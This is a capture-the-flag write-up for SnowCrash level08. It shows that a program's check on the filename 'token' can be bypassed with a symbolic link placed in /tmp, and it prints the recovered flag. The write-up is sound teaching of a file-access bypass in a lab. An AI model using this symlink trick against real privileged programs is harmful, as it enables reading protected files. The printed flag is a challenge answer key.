# Level08 Exploit

In this challenge, we have an executable named `level08` and a file named ``token`. Upon attempting to execute `level08` with `token` as an argument, we receive a permission denied message.


## Initial Exploration

Let's start by exploring the contents of the directory:

```bash
level08@SnowCrash:~$ ls
> level08  token
```

Next, we attempt to execute the `level08` executable with the `token` file:

```bash
level08@SnowCrash:~$ ./level08 token 
> You may not access 'token'
```

We also verify the contents of the `token` file:

```bash
level08@SnowCrash:~$ cat token
> cat: token: Permission denied
```

## Vulnerability Analysis

Upon analyzing the `level08` executable using the `strings` command, we discover that it verifies whether the input file is named `token`. This suggests that the program restricts access to a file named `token`.

```bash
level08@SnowCrash:~$ strings level08 
> ...
> %s [file to read]
> token
> You may not access '%s'
> ...
```

## Exploit Procedure

To bypass this restriction and access the `token` file, we can create a symbolic link with a different name that points to the `token` file. Then, we can execute the `level08` executable with this symbolic link as an argument.

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/flag
```

Now, we rerun the `level08` program with the symbolic link:

```bash
level08@SnowCrash:~$ ./level08 /tmp/flag
> quif5eloekouj29ke0vouxean
```

## Conclusion

By creating a symbolic link with a different name pointing to the `token` file, we successfully bypassed the access restriction imposed by the `level08` program and retrieved the flag.
